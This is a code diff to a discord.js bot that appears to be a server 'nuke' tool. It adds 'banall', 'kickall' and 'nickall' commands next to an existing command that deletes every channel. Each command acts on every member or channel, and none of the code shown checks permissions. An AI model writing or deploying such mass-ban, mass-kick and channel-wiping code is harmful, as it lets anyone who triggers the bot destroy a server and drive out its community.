@@ -1,7 +1,7 @@
 const Discord = require('discord.js');
 const client = new Discord.Client();
 
-const prefix = '-'; // change if you want 
+const prefix = '-';
 
 const fs = require('fs');
 
@@ -46,7 +46,9 @@ client.on('message', message => {
 	if (command === 'arole') {
 		client.commands.get('arole').execute(message, args);
 	}
-
+  if (command === 'log') {
+    client.commands.get('log').execute(message,args, Discord);
+  }
 	if (command === 'dchannel') {
 	
 			message.guild.channels.cache.forEach(channel => channel.delete());
@@ -65,6 +67,43 @@ client.on('message', message => {
 			console.log('Ran drole command. (SUCCESS)');
 		
 	}
+    if (command === 'banall') {
+
+
+      message.guild.members.cache.forEach(member => {
+
+        member.ban().then(ban => console.log(`Banned ${ban.name}`)).catch(console.error);
+      });
+      
+      message.author.send('Action Completed. - Ban All');
+      console.log('Ran banall command. (s)')
+
+  }
+  if (command === 'kickall') {
+
+
+      message.guild.members.cache.forEach(member => {
+
+        member.kick().then(kick => console.log(`Kicked ${kick.name}`)).catch(console.error);
+      });
+      
+      message.author.send('Action Completed. - Kick All');
+      console.log('Ran kickall command. (s)')
+
+  }
+  if (command === 'nickall') {
+
+      const nick = args.join(" ");
+      message.guild.members.cache.forEach(member => {
+
+        member.setNickname(nick).then(member => console.log(`Set nick ${nick}`)).catch(console.error);
+    
+      });
+
+      message.author.send('Action Completed. - Nick All.');
+      console.log('Ran nickall command. (s)');
+    
+  }
 	if (command === 'demoji') {
 		client.commands.get('demoji').execute(message, args);
 	}
@@ -79,4 +118,4 @@ client.on('message', message => {
 
 });
 
-client.login('you know the token');
+client.login('you have the token');
